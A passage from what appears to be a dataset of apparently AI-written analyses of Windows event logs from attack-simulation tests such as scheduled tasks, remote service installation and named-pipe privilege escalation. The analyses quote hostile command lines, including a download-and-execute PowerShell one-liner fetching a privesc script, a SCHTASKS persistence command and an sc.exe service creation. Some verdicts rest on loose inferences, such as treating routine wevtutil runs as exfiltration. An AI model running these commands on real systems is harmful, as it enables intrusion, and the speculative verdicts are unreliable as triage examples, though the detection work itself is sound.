   - Security log `EventID 4672` shows the privileges assigned during a session for user `admin_test` which includes high-level privileges such as `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and `SeImpersonatePrivilege`. This seems odd unless there is a legitimate administrative task being conducted, which is not evident here.

4. **Command Line Execution:**
   - The use of `whoami`, `hostname`, and other system utilities captured in the Sysmon logs (e.g., `whoami.exe`, `hostname.exe`) might be legitimate utilities for system checks but their usage in conjunction with the PowerShell script suggests reconnaissance activities.

5. **PowerShell Use:**
   - The PowerShell script executed (as seen in Windows PowerShell and Sysmon logs) uses admin capabilities to gather and manage user accounts, which should be scrutinized further.

### Assessment:
The detected activity appears to be an account manipulation attack. Potentially malicious actors may be attempting to rename high-privileged accounts, which is a classic sign of an attempt to gain or ensure sustained access. Changing user names, particularly of privileged accounts, is often utilized to hide such accounts from regular checks and to establish unauthorized control over the system.

### Risks and Recommendations:
- **Integrity and Availability Risk:** There is an immediate risk to system integrity and availability due to account manipulation which could lead to further exploitation.
- **Immediate Containment:** The account `admin_test` should be reviewed for unauthorized changes, usage, and should be monitored closely. Access from `192.168.0.102` should be temporarily restricted and investigated.
- **Forensic Investigation:** Conduct a thorough investigation into other potential changes and access coming from similar patterns or IPs.
- **Review and Revert:** Review system time alterations and check other system logs to corroborate event timestamps aligning with known legitimate activities.

### Conclusion:
- Resolution: **MALICIOUS** - The activities recorded in the logs point to attempts at unauthorized system access and manipulation, requiring immediate corrective and investigative action."
Scheduled task Local,"### Detailed Analysis of the Windows Event Logs

After conducting a thorough examination of the event logs supplied, the following observations have been made:

#### Sysmon Log Analysis
1. **Process Execution:**
   - Multiple executions of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\admin_test`. These executions appear in rapid succession. While `wevtutil.exe` is a legitimate Windows utility for managing event logs, frequent usage could indicate log tampering or data collection attempts.
   - The presence of `HOSTNAME.EXE` and `whoami.exe` is typical for determining system and user information, respectively. This may indicate a user or script evaluating the environment.
   
2. **Scheduled Task Creation:**
   - The execution of `cmd.exe` with the command `SCHTASKS /Create /SC ONCE /TN spawn /TR C:\windows\system32\cmd.exe /ST 20:10` is noted. This command schedules a task named ""spawn"" to run another command shell at a specific time. This could potentially be used by adversaries to execute malicious scripts or commands persistently.

#### Security Log Analysis
- The event logs depict several logon and privilege escalation activities involving the user `admin_test`.
  - Event 4624 indicates successful logons with logon type `3` which suggests a network logon. This might be typical behavior if the user is accessing remotely but should be scrutinized if unexpected.
  - Events 4672 indicate the assignment of special privileges typically associated with administrative users. The list of privileges, which includes `SeDebugPrivilege`, `SeBackupPrivilege`, and more, suggest high-level access that could be exploited.

#### Application Log Analysis
- There is a record from `Microsoft-Windows-Security-SPP`, representing normal software protection activities. Nothing directly suspicious was found here based on this singular entry.

#### Conclusion
The logs indicate a **SUSPICIOUS** pattern of behavior:
- The creation of scheduled tasks using `SCHTASKS` is concerning, specifically if unexpected or unnecessary for business operations.
- The frequent use of `wevtutil.exe` could be indicative of attempts to cover tracks or modify event logs.
- The presence of elevated privileges on an account performing these actions suggests a risk of improper access or potential abuse.

### Recommendations
- **Immediate Investigation:** Verify if the scheduling of tasks and use of `wevtutil.exe` aligns with known administrative tasks. If unauthorized, investigate the source and intention behind these activities.
- **User Activity Review:** Conduct a review of the actions of `admin_test` user's account, ensuring no unauthorized access or configuration changes have occurred.
- **Security Audit:** Reinforce vigilance by auditing accounts with elevated privileges, particularly focusing on privilege management and any new scheduled tasks.
- **Monitoring and Alerts:** Establish stricter monitoring of critical systems and processes to detect unusual patterns early. Enhance alerting for use of scheduling functions and log management utilities by non-system processes or uncommon users.

In conclusion, while there are indicators of potentially malicious activities, further investigations would substantiate these findings, providing clarity and context to the observed patterns."
Process Injection with Go using CreateThread WinAPI,"Based on the Windows event logs provided, I'll analyze the entries for any indicators of malicious behavior and provide a detailed assessment.

### Analysis

1. **Application Logs:**
   - The entries from the `SecurityCenter` and `Microsoft-Windows-Security-SPP` providers indicate normal system operations related to software protection. Windows Defender is active, and there are routine communications from the Software Protection Platform. Nothing in these entries directly indicates malicious activity.

2. **PowerShell Logs:**
   - All the PowerShell events indicate the execution of `CreateThread.exe` using a PowerShell command line that includes a path typically associated with temporary or downloaded files: `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\bin\\x64\\CreateThread.exe -debug`.
   - The use of PowerShell to launch an executable from a temporary location, especially with the `-debug` parameter, can be suspicious and is often associated with attempts to bypass security controls. This behavior warrants further investigation to determine the purpose and legitimacy of `CreateThread.exe`.

3. **Security Logs:**
   - The logs reflect time synchronization events involving `svchost.exe`. Changing times and synchronization messages are typical, and the involvement of the LOCAL SERVICE and NT AUTHORITY accounts suggests normal system operations. There is no direct evidence of compromise here.

4. **Sysmon Logs:**
   - There are a number of process creation events analyzed, which include:
     - Normal system processes like `wevtutil.exe`, `conhost.exe`, `whoami.exe`, `svchost.exe`, `hostname.exe`, and `WindowsPowerShell`.
     - The repeated invocation and potential spawning of `CreateThread.exe` via PowerShell, consistent with the earlier logs.
   - The use of standard Windows utilities is generally benign; however, again, the presence of `CreateThread.exe` is noteworthy and aligns with potentially suspicious activity seen in the PowerShell logs.

5. **System Logs:**
   - Time-related adjustments and Windows Update operations are logged. These entries describe typical system maintenance actions, with updates and time synchronization prevalent. No anomalies suggesting compromise are found here.

### Conclusion

Given the analysis, the entry showing the execution of a potentially suspicious binary (`CreateThread.exe`) via PowerShell from a temporary directory stands out as potentially dangerous. This behavior is unusual in a Windows environment and could indicate an attempt to execute arbitrary or malicious code.

### Resolution: **SUSPICIOUS**

The activity recorded involving the PowerShell execution of `CreateThread.exe` is suspicious and requires further investigation. Investigators should:
- Examine `CreateThread.exe` for known vulnerabilities or detected malware by checking it against threat intelligence sources or using anti-virus tools.
- Track the source and integrity of `CreateThread.exe` to determine if it was legitimately placed on the system.
- Review user activity logs to see if an admin initiated this task or if it was automated/scripted by malicious software.
- Conduct a hunt across the network for similar activities to ensure this behavior is not part of a larger, coordinated attack.

Further action should be undertaken to validate the nature of this executable and prevent any potential compromise."
Remote Service Installation CMD,"### Analysis of Logs

#### Suspicious and Anomalous Behaviors:

1. **PowerShell Execution:**
   - A PowerShell process (`C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe`) was executed by the user `SERVER002\\admin_test`.
   - Typically, you would want to see what commands were executed with PowerShell, however, those details are not available in this log entry.

2. **Service Creation and Execution:**
   - A service was created with the name `fileTestService_CMD` using `sc.exe`, and it was set to auto-start. The service points to `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.003\\bin\\fileService.exe`.
   - This is particularly concerning because typically legitimate services are not created in the Temp directory.
   - The `cmd.exe` command line used to create the service is suspicious and automated in nature:
     ```
     cmd.exe /c sc.exe \\\\localhost create fileTestService_CMD binPath= ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.003\\bin\\fileService.exe"" start=auto type=Own & sc.exe \\\\localhost start fileTestService_CMD
     ```
   - The execution of `fileService.exe` implies possible further malicious behavior since this executable lacks metadata information such as version, product, or company details.

3. **High Integrity Level Execution:**
   - Processes like `cmd.exe`, `sc.exe`, and `fileService.exe` were all executed with high integrity levels, suggesting possible unauthorized privilege escalation.

4. **Execution of Enumeration Commands:**
   - The tools `hostname.exe` and `whoami.exe` were run, potentially indicating reconnaissance activities to gather environmental information.

5. **Temporary File Locations:**
   - The location for `fileService.exe` is in a temporary directory, which is unusual for an application meant to be installed and persistently executed as a service.

#### Indicators of Malicious Activity or Compromise:

- **Automated Service Creation and Launching:** The use of `sc.exe` in combination with service creation in the Temp directory is a strong sign of potentially malicious activity.
- **Untrusted File Metadata:** `fileService.exe` lacks recognizable metadata, raising suspicion about its origin and purpose.
- **Privilege Escalation:** The high integrity level of these actions suggests elevated privileges, which could indicate that an attacker is attempting to escalate their access.

### Conclusion

**Resolution: MALICIOUS**

The events described in the logs indicate clearly malicious activities. Specifically, the creation and execution of a service from a temporary directory, especially executed under high integrity, combined with the lack of metadata for the executable, and the use of commands (`whoami`, `hostname`) that gather system information, are strong indicators of a compromise.

### Recommended Actions:

1. **Immediate Isolation:** Isolate `Server002` from the network to prevent potential lateral movement and further compromise.
2. **Investigation:** Perform a thorough forensic investigation on `Server002` to identify other malicious footprints and the potential scope of the compromise.
3. **Service Removal:** Remove the `fileTestService_CMD` service and the `fileService.exe` file from the system.
4. **Review User Actions:** Audit actions performed by `SERVER002\\admin_test` for any anomalies or unauthorized access.
5. **System Restore/Backup:** Consider restoring the system from a clean backup.
6. **Deploy EDR Solutions:** Deploy or enhance Endpoint Detection and Response solutions to catch such incidents in real-time in the future.
7. **User Education:** Conduct training sessions to raise awareness about securely managing system services and preventing unauthorized changes."
Task Scheduler via VBA,"Upon analyzing the provided logs, several aspects emerge that highlight potential malicious activities:

1. **PowerShell Logs Analysis**:
   - The PowerShell commands executed are particularly concerning:
     - The command involves downloading a script from a GitHub URL using the `iwr` (Invoke-WebRequest) command and subsequently executing it using `IEX`. This practice is commonly associated with malware execution and could allow untrusted scripts to run directly on the system.
     - The command also indicates the use of a macro file with `Invoke-script -macroFile`, which could suggest an attempt to automate a task or execute a macro that might be malicious.
   - Given that the script is fetched from an online resource and executed in-memory without saving locally, it matches commonly observed attack patterns for delivering and executing malicious payloads.

2. **Sysmon Logs Analysis**:
   - The execution of `powershell.exe` is observed with high integrity, and it is initiated by a known process (`wsmprovhost.exe`). The command executed matches the PowerShell logs, further corroborating the suspicious activity of downloading and executing remote scripts.
   - Repeated execution of Windows utilities like `wevtutil.exe`, `whoami.exe`, and `hostname.exe` using an account with high integrity. The frequent `wevtutil` usage with elevated privileges might indicate an attempt to manage event logs, potentially covering tracks of malicious activities.
   - Multiple processes are executed by the same user (`SERVER002\admin_test`) and have a high integrity level, indicative of a privileged execution that aligns with attempts to escalate privileges or maintain persistence.

3. **Assessment**:
   - The combination of the PowerShell activities with the process executions logged in Sysmon strongly suggests malicious activity. The pattern of downloading scripts from an untrusted source, running them with elevated privileges, and potentially manipulating event logs to evade detection is classic behavior of malware and threat actors.

**Resolution**: **MALICIOUS**

### Guidance on How to Proceed:
- Immediately investigate the system `Server002` to isolate it from the network and prevent any potential spread of malicious code.
- Review and verify the content and origin of the script at the URL specified in the PowerShell command.
- Check for any unauthorized changes, installations, or processes on the host.
- Audit and analyze the network traffic to and from the host around the time the events occurred for additional indicators of compromise.
- Initiate a threat remediation and recovery plan, which may include restoring systems to known good states and patching potential vulnerabilities that allowed the compromise.
- Implement enhanced monitoring and logging to achieve greater visibility of similar activities in the future."
Change Startup Folder - HKCU Modify User Shell Folders Startup Value,"After a detailed analysis of the provided logs, here's the breakdown of potential indicators of malicious activity:

### Windows PowerShell Log:
- **Suspicious Use of PowerShell**: The PowerShell scripts attempted to create a directory in the temporary location, copy the calculator executable to that location, and modify the Windows registry to set this directory as a startup folder. This can be considered suspicious behavior as adversaries often use PowerShell for lateral movement, persistence by modifying startup entries, or to execute payloads like a legitimate executable (calc.exe in this case) from unexpected directories.

### Security Log:
- **Privilege Escalation**: There is an event indicating a logon with elevated privileges (`SeDebugPrivilege, SeSystemEnvironmentPrivilege`, etc.) under the account `admin_test`. Such privileges, especially `SeDebugPrivilege` and `SeSystemEnvironmentPrivilege`, could allow a program to perform privileged operations and interact with other processes, often not required for regular user activities unless for administrative tasks.

- **Time Discrepancies**: Log entries show system time was set backwards (from 15:47:36 to 15:47:33). This might suggest attempts to cover tracks or manipulate time-dependent operations. This activity is not innately malicious but is often correlated with attempts to evade detection.

### Sysmon Log:
- **Command Execution**: Several instance of `wevtutil.exe` were observed running. This utility is often used for exporting log files, clearing event logs, or modifying log configuration, which could be normal admin activity but could also be used to cover tracks. Additionally, execution of `whoami` and `hostname` which might be used by an attacker for reconnaissance to understand the environment.

- **Microsoft Edge Update Activity**: Legitimate reference to Microsoft Edge updates is noted, suggesting software installation or update processes which appear uncontrolled but are usual activity for system maintenance under `NT AUTHORITY\SYSTEM`.

### Conclusion and Resolution:
- **Resolution: SUSPICIOUS**
  - The creation of a directory in the temporary folder, copying `calc.exe`, and modifying the registry for persistence is a classic tactic seen in malicious activities. This action requires further investigation to assess the context of execution.
  - Elevated privileges used by `admin_test` and backward time manipulation raise concerns about possible unauthorized control or setup for later exploitation.
  - Further investigation and correlation with other activities should be conducted to determine the intent and origin of these activities.

### Guidance on How to Proceed:
1. **Further Investigation**: 
   - Determine the origin of the suspicious PowerShell activity—was it an admin executing these actions or an external script? Monitoring and alerting for future attempts would be prudent.
   - Verify the legitimacy of the user account actions (admin_test) through user behavior analytics or additional log correlation to pinpoint if there’s an insider or compromised account issue.
   - Check for any lateral movements from this system to others, especially any other login attempts from `admin_test` account.

2. **Mitigation**:
   - Temporary block or restrict PowerShell execution policies on this server if not critical for ongoing operations.
   - Configure or refine the logging and monitoring to detect similar activities in real-time, especially looking for registry modifications and privilege escalations.
   
3. **Response Actions**:
   - Conduct a thorough forensic investigation into what other files might have been dropped or executed during this anomaly.
   - Validate external connections during the timeframe of these events to rule out external C2 beaconing or data exfiltration."
Azure - adding user to Azure role in subscription,"Upon reviewing the provided Windows event logs, several items stand out that warrant further investigation in understanding if they indicate malicious activities or abnormalities. Here's a breakdown of my findings:

### Suspicious Behavior Observed:

1. **User Enumeration through Event ID 4798**:
   - There are multiple entries for Event ID 4798 related to querying group membership information for various accounts such as ""Guest,"" ""Administrator,"" ""admin_test,"" etc. This event ID is commonly associated with attempts to enumerate user accounts and group memberships, potentially indicating recon activities.
   - The process `CompatTelRunner.exe` is associated with these queries. While this executable is a known Microsoft telemetry component, its invocation in the context of querying user groups could be anomalous unless it's known to be scheduled or triggered by another legitimate action.

2. **Unusual PowerShell Activity**:
   - The Sysmon logs show instances where PowerShell was used with Event ID 1, indicating script or module invocation. The command lines consisting of serialization of credentials and potential role assignment indicate suspicious use of PowerShell, which can be indicative of privilege escalation or lateral movement efforts.
   - The command involves connecting to Azure services using provided credentials and assigning roles, which might mean unauthorized access or manipulation of Azure resources.

3. **Process Spawns and Connectivity**:
   - Multiple `wevtutil.exe` and `conhost.exe` processes are seen in conjunction with `admin_test` and PowerShell activities could indicate an attempt to hide or tamper with event logs, therefore evading detection.
   - The presence of a `whoami.exe` invocation could indicate an attempt to gain information about the currently logged-in user or privilege levels.

### Assessment:
- The combination of user account enumeration, suspicious PowerShell script execution involving credential manipulation, and potential tampering activity with event logs through tools like `wevtutil.exe` are indicative of **suspicious behavior that may suggest malicious intent** or at least warrant further investigation.

### Resolution:
- **SUSPICIOUS**: While there's no definitive proof of a compromise, the observed activities resemble common tactics used in the initial phases of an attack (reconnaissance and privilege escalation). It is recommended to further investigate by checking:
  - Whether the used credentials (for Azure) were legitimate and the scope of impact if unauthorized roles were assigned.
  - Validate if these activities were scheduled or part of a legitimate process, particularly focusing on the execution pattern of `CompatTelRunner.exe`.
  - Monitor for any further suspicious behavior and consider a broader security review to ensure no active compromisation exists.

### Guidance on How to Proceed:
1. **Containment**:
   - Isolate the host if further suspicious activity is detected to prevent lateral movement.
  
2. **Incident Investigation**:
   - Check Azure activity logs to confirm if any unauthorized actions were taken.
   - Review scheduled tasks or group policy to confirm the execution reasons for `CompatTelRunner.exe`.

3. **Forensic Analysis**:
   - Conduct a deeper analysis of any running processes and their origins.
   - Analyze network traffic to ensure no data exfiltration attempts occurred.

4. **Enhance Monitoring**:
   - Implement enhanced monitoring around suspicious accounts and tools like PowerShell via endpoint protection solutions.
   - Validate user role assignments and configurations within Azure and related cloud assets.

5. **Employee Awareness and Training**:
   - Train staff on recognizing phishing attempts or social engineering tactics that could lead to credential compromises used in such scripts. 

These steps would ensure any potential threats are contained and identified effectively, reducing the risk of undetected malicious activities."
Scheduled Task Executing Base64 Encoded Commands From Registry,"The provided Windows event logs indicate several activities that require close inspection for potentially malicious behavior. Upon examination, the following observations stand out:

1. **System Time Change:**
   - There are multiple instances of system time being set backward (Event ID 1 in Windows-Kernel-General and Security log Event ID 4616). A system time reset without legitimate reasons, especially when setting timestamps backward, can be an indicator of malicious activity. This is sometimes done to manipulate logs or avoid detection.

2. **Registry and Scheduled Task Activities:**
   - A Registry key is being modified and then a scheduled task is being created in quick succession (Sysmon Event ID 1 and 5). The command chain involves `cmd.exe` and `schtasks.exe` to execute a PowerShell command from a base64 encoded registry value.
   - The process altering the registry and scheduling a task could serve a backdoor or persistent mechanism for executing Powershell scripts encoded in Base64. The presence of `IEX` and encoded PowerShell commands is a known pattern used by attackers to obfuscate operations.

3. **Processes and Account Activity:**
   - `svchost.exe`, `wevtutil.exe`, and related console applications (`conhost.exe`) appear frequently. While these are normal system processes, the high frequency and sequence of execution, particularly with `admin_test` account, might warrant further examination.
   - The command `whoami.exe` is executed which can be benign, but when analyzed in the context of other suspicious activities, serves to orient an attacker confirming execution context.
 
4. **Scheduled Tasks and PowerShell use:**
   - The scheduled task involves running PowerShell in a minimized state, executing encoded commands, which suggests an attempt to execute scripts discreetly.

**Assessment & Resolution:**
- **SUSPICIOUS:** The combination of altering system time, executing encoded PowerShell commands via scheduled tasks, and modifying registry keys suggests suspicious activity. While this activity on its own might not conclusively establish a breach, it is aligned with behavior often seen during system compromises. Given the encoding and execution via scheduled task, there's enough evidence to suspect a potential malicious intent requiring further investigation.

**Guidance on How to Proceed:**
1. **Immediate Actions:**
   - Isolate the affected host to prevent further potential misuse or spread until a thorough investigation can be performed.
   - Review access logs and credentials used around the timestamps of these events for unauthorized access.

2. **Detailed Investigation:**
   - Decode the Base64 encoded PowerShell command to ascertain its intent.
   - Check integrity and hash of critical system files like `svchost.exe` and `wevtutil.exe` against known good baselines.
   
3. **Monitoring and Alerting:**
   - Implement or continue monitoring for similar patterns across the network.
   - Set up alerts for any unauthorized or abnormal scheduled task creation.

4. **User Education and Awareness:**
   - Educate users, especially admin accounts, on recognizing and preventing suspicious activities and potential phishing attempts that might lead to such a compromise."
Domain Password Policy Check: No Special Character in Password,"Upon examining the provided logs, several activities caught my attention, particularly involving PowerShell commands and events related to process execution. Here's a detailed analysis of the events and my assessment:

### Detailed Analysis:

#### PowerShell Logs:
1. **Command Execution**: The PowerShell script executed shows attempts to check for a stored credential file and reset a user's Active Directory password using PowerShell commands. This is a significant behavior as it involves credential handling and password modification operations.
   - Specifically, the script checks if a file containing user credentials exists and then tries to change the password if the file is present.
   - It utilizes both `New-Object` and `Set-ADAccountPassword`, which are powerful commands in PowerShell for manipulating credentials and user accounts.
   
2. **Potential Anomalies**: 
   - The use of hardcoded passwords and storage of passwords in files is concerning, from a security perspective, this may lead to credential exposure.
   - The script itself uses a repetitive password ""UpperLowerLong333noSpecialChar"", which is not a best practice and can signal weak security settings or testing environments.

#### Sysmon Logs:
1. **PowerShell Execution**: The Sysmon logs show the execution of PowerShell and other processes with elevated privileges (user ""SERVER002\\admin_test"").
   - Multiple instances of `powershell.exe` and `conhost.exe` are executed around the same timeframe, correlating with the PowerShell events above.
   - Execution of administrative tasks with `wevtutil.exe` and `conhost.exe` indicates potential system log or event log operations which can be used for malicious intent, such as clearing logs to cover tracks.
   
2. **Other Processes**:
   - There is extensive activity around the `setup.exe` process related to Microsoft Edge updates, all running under the `NT AUTHORITY\SYSTEM` account. This by itself is not suspicious unless it is seen interacting with network or unexpected resources.

#### Security Logs:
1. **Security Auditing Event 4799**: A single event points to the use of a `setup.exe` from a temporary directory as part of Microsoft Edge Update. Although this is standard action for update processes, the context with elevated privileges can potentially be suspicious.

### Assessment:

Given the provided logs, there are definite indicators of potentially **suspicious behavior**:

- The PowerShell script executing tasks to manipulate user credentials suggests either testing, administrative negligence or possibly malicious intent.
- System administrative tools executing in close succession could indicate attempts to escalate privileges or manipulate the environment stealthily.
- The appearance of update tasks could be considered benign unless there's context showing it as anomalous, but given the elevated rights, it warrants further examination in the context provided.

### Resolution: SUSPICIOUS

Although no explicit evidence of malicious activity like known malware signatures or clear data exfiltration was recorded, the use of credentials and password management within PowerShell, combined with the Elevated privileges and potential misuse of processes, points to activity that should be investigated more comprehensively to confirm intent and ensure that there is no ongoing compromise.

### Recommendation:
- **Immediate Action**: Review the context and execution history of the PowerShell scripts. If this is legitimate administrative activity, ensure that such scripts are secured and follow best practices for password management.
- **Audit and Monitoring**: Increase monitoring on account activities, especially those involving elevated privileges. Use of PowerShell should be logged and reviewed regularly.
- **Rule Validation**: Verify the legitimacy of the processes and scripts in use, and confirm they align with the expected administrative practices."
Bad Potato,"Upon review of the Windows event logs provided, I have conducted an in-depth analysis to identify any indicators of malicious activity. Here is a summary of the findings:

1. **Use of PowerShell**: There is an instance where PowerShell is used to execute a script located in a temporary directory (`C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\\Externalfiles\\`). The command includes operations to start a process and terminate it after a sleep period, specifically targeting `notepad.exe` and a custom script named `script.exe`. The use of PowerShell in this manner, particularly from a temporary directory, is often seen as suspicious since PowerShell is a common tool leveraged in post-exploitation activities for script execution, automation, and lateral movement within a network.

2. **Repeated Execution of `wevtutil.exe` and `conhost.exe`**: There are multiple executions of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\admin_test`. This can be innocuous in certain contexts, but without additional context or reasons for such repeated usage, it could be indicative of attempts to manipulate or read event logs, which is a technique sometimes used by threat actors to cover their tracks.

3. **Commands from Elevated Context**: The PowerShell activity was executed with a high integrity level, which means it had elevated privileges. This aligns with potential administrative controls and could be misused for malicious purposes if the account has been compromised.

4. **Processes Related to Scheduled Updates**: The presence of Microsoft Edge updates and scheduled tasks such as `MicrosoftEdgeUpdate.exe` and `taskhostw.exe` executing as System-level tasks appears consistent with typical Windows behavior and does not suggest malicious activity.

In summary, there is not a direct confirmation of malicious activity, but there are several indicators that merit further investigation:

- The unconventional use of PowerShell to execute and manipulate processes in a temporary directory warrants a closer look, especially to verify if the scripts executed (e.g., `script.exe`) are legitimate and known within your organization.
- The persistence and frequency of certain processes (`wevtutil.exe`, `conhost.exe`) might be normal but should be verified against normal system and user behavior to ensure they aren't employed for log tampering or privilege escalation.

**Resolution**: **SUSPICIOUS**

Given the atypical use of PowerShell and repetitive use of `wevtutil.exe` and `conhost.exe`, further examination is necessary. Actions should include:
- Reviewing user activity and authentication logs for `SERVER002\admin_test` to identify anomalies.
- Checking the integrity and origin of the PowerShell scripts being executed.
- Scanning the affected system for any signs of compromise or persistence mechanisms, such as unusual scheduled tasks or altered system files.

Proceed by investigating the source and authorization of these activities, working in conjunction with IT to reassess security configurations and user permissions."
Add a driver,"Upon reviewing the provided Windows event logs, there are several observations worthy of attention:

1. **Frequent Use of wevtutil.exe and conhost.exe**:
   - The logs highlight repetitive executions of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\\admin_test`. While these are legitimate Windows processes, their frequent invocation in quick succession is atypical and could signify an attempt to manipulate or read large numbers of event logs.
   - **wevtutil.exe** is a command-line utility for managing Windows event logs, which can be used to clear logs or query them, sometimes leveraged by attackers to cover tracks.

2. **Time Discrepancies**:
   - The system and security logs indicate a time change event around `15:03:00`, where the system time was adjusted backward. This can sometimes be indicative of an attempt at log tampering as attackers may adjust the time to sync or desync logs for obfuscation.
   - Event ID 4616 from the security log shows changes in system time, which merits further investigation to understand the rationale behind this adjustment.

3. **Command Execution**:
   - A notable command from the Sysmon log is `cmd.exe` initiating `pnputil.exe` to interact with USB storage driver `C:\Windows\INF\usbstor.inf`. While this can be a legitimate action to manage USB drivers, it might also signal unauthorized attempts to manipulate driver settings related to USB devices. This operation under user `SERVER002\\admin_test` is suspicious because such changes are typically made under administrative or controlled conditions.

4. **Uses of HOSTNAME.EXE and whoami.exe**:
   - Execution of `HOSTNAME.EXE` and `whoami.exe` suggests that processes are gathering system information, possibly for reconnaissance purposes. While their presence alone isn't suspicious, combined with other activities, they could suggest information gathering by a malicious entity.

5. **The Integrity Level**:
   - The integrity level of the processes is consistently high, reflecting administrative privileges, which raises the stakes if the logs are found to be malicious.

### Assessment and Resolution:

In conclusion, the blend of frequent `wevtutil.exe` executions, the backward system time change, and interaction with USB drivers via `pnputil.exe` are red flags. These activities point towards potential log tampering, unauthorized system information gathering, or preparation for unauthorized device access, which are common tactics used by adversaries to obscure activities or prepare for subsequent malicious actions.

Therefore, the assessment is **SUSPICIOUS**. This activity is noteworthy and warrants further investigation to determine the intent behind these actions and to confirm or rule out malicious behavior.

#### Guidance on Proceeding:
- **Investigate the Source of Time Change**: Determine why the time was changed and if there were legitimate reasons or configurations that resulted in this.
- **Review User Activity**: Check the logs for `admin_test` user activity to validate if the performed actions were legitimate and approved.
- **Inspect Driver Modifications**: Investigate any recent changes to USB driver settings, alongside system and network changes potentially related to these logs.
- **Conduct Threat Hunting**: Engage in frequent and thorough threat hunts on the system to capture any anomalies not detectable through logs alone."
Named pipe client impersonation,"### Detailed Analysis:

1. **Application Log:**
   - The application log entries indicate that Windows Defender is active and operational on the host (""Windows Defender, SECURITY_PRODUCT_STATE_ON""). There is nothing suspicious or anomalous in these entries, as an active security product is a good security posture indicator.

2. **Windows PowerShell Log:**
   - The Windows PowerShell log entries show the execution of a PowerShell command line that includes downloading and executing a script from a GitHub URL: `IEX (IWR 'https://raw.githubusercontent.com/script/script/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/script.ps1' -UseBasicParsing); script -Technique NamedPipe -Verbose`.
   - This is highly suspicious behavior, as it indicates the download and execution of a remote script, which often signals unauthorized or malicious activity, especially the reference to ""privesc"" suggesting privilege escalation attempts.

3. **Security Log:**
   - The security logs show multiple actions involving the `admin_test` user, including logon events and assignments of a wide range of privileges, such as `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc., which are highly sensitive privileges that could be leveraged for malicious purposes.
   - Additionally, the use of NTLM authentication and remote login from different IP addresses (IPv6 addresses) is noted. While the actions themselves may not be outright malicious, the context alongside the PowerShell activity raises the suspicion level considerably.

4. **Sysmon Log:**
   - The Sysmon logs reveal process creations, especially of Microsoft Edge Update, svchost.exe, conhost.exe, and PowerShell itself.
   - The execution of a script via PowerShell is corroborated here with a high-integrity level execution, which supports potential privilege escalation or system compromise.
   - No explicit malicious binaries or files are immediately identified, but the pattern of execution and specific use of PowerShell is aligned with the evidence of potential compromise.

5. **System Log:**
   - There is an event indicating an alteration in system time by svchost.exe, which can sometimes be employed by malicious actors to evade detection or to manipulate the system state in their favor.

### Assessment:
- The collection of logs showcases a potential security incident that warrants deeper investigation. The key concerns include the usage of PowerShell to download and execute a script from GitHub, the privileges adjusted for the `admin_test` user, and the irregularities around these set of events like time changes. These raise a red flag indicative of suspicious and potentially malicious activity but require confirmation through deeper forensic investigation.

### Resolution: SUSPICIOUS

### Guidance:
- **Immediate Actions:**
  - Isolate the affected system (Server002) from the network to prevent any further potential malicious activities.
  - Conduct a comprehensive forensic analysis on the system, focusing on the downloaded PowerShell script and any changes or traces it might have left.
  - Review logs for anomalous account usage, especially surrounding the `admin_test` account and correlate with user activity records for legitimacy.
  
- **Further Investigation:**
  - Confirm the intention and content of the PowerShell script hosted at the specified URL and ascertain whether it contains any previously known or new exploit signatures.
  - Examine any persistence mechanisms potentially implemented by the attacker by reviewing system startup scripts, scheduled tasks, and services.
  
- **Recommendations:**
  - Harden PowerShell usage restrictions using constrained language mode and logging to capture detailed activity.
  - Review and limit administrative rights, especially focusing on reducing privilege allocation to system-critical accounts.
  - Enhance monitoring on privileged account usage and enact stricter access controls to prevent unauthorized privilege escalation."
RunPE via VBA,"**Detailed Analysis of the Windows Event Logs:**

**1. Security Logs:**
- **Event ID 4624 (Logon Event):** This indicates a system logon with LogonType 5, which is a service logon typically used for system services. The logons for user ""SYSTEM"" via ""services.exe"" are expected in a server environment and appear consistent with legitimate system activity.
  
- **Event ID 4672 (Special Privileges Assigned):** Indicates that the user ""SYSTEM"" is being granted special privileges such as SeTcbPrivilege and SeDebugPrivilege. Although extensive privileges are noted, it is typical for the SYSTEM account in a Windows environment to possess these.

- **Event ID 4798 (Account Enumeration):** Frequent enumeration of accounts such as ""Administrator"" and ""Guest"" by processes like ""taskhostw.exe"" can be probing behavior. However, since ""SERVER002$"" is a computer account, it may be related to some system maintenance or monitoring activity.

- **Event ID 5379 (Credential Validation):** Failed credential validation attempts for ""MicrosoftAccount:user=02txoixylodcstop"" could be a concern if scoped to particular users or in high frequency, signaling continual attempts to authenticate against a service.

**2. Application Logs:**
- **Event ID 16394 (Software Protection Service Events):** Routine SPP events that are consistent with typical Windows functionality related to licensing.

**3. Windows PowerShell Logs:**
- **Event ID 600:** Logs reveal a potentially malicious PowerShell command that fetches a script from a URL and executes it. This is a critical indicator of compromise as it references a suspicious network call and script execution that could be utilized for exploitation (e.g., Invoke-Script with Exploit).

**4. Sysmon Logs:**
- **PowerShell Execution:** The execution of powershell.exe fetching and executing scripts from a suspicious URL, ""https://raw.githubusercontent.com/file/file-file/master/files/data.002/src/script.ps1"", poses a significant risk. This kind of activity is often associated with malware delivery or attack operations.
  
- **Event ID 1 (Process Creation):** Multiple services, including system-critical operations like MicrosoftEdgeUpdate, wermgr.exe, and others, are operating under NT AUTHORITY\SYSTEM. While these are typically normal, the combination with suspicious PowerShell activity elevates concern.

- **Use of wevtutil.exe by admin_test:** This command-line utility is used to export log data, which might indicate a form of data exfiltration.

**Assessment:**
- **BENIGN:** Routine system operations (e.g., genuine service logons, software protection events).
- **SUSPICIOUS:** Repeated account enumeration events might need further review to ensure legitimacy.
- **MALICIOUS:** The PowerShell activities are distinctly malicious by using scripts from an external source and directly indicating attempts at exploitation.

**Resolution & Recommendations:**
- **Resolution: MALICIOUS**
  - Immediate isolation of the affected host (Server002) to prevent any potential widespread effect stemming from the identified malicious PowerShell activity.
  - Conduct a detailed forensic analysis of the PowerShell command and downloaded script specifics.
  - Evaluate firewall and web proxy logs for external communication reflecting the suspicious URLs.
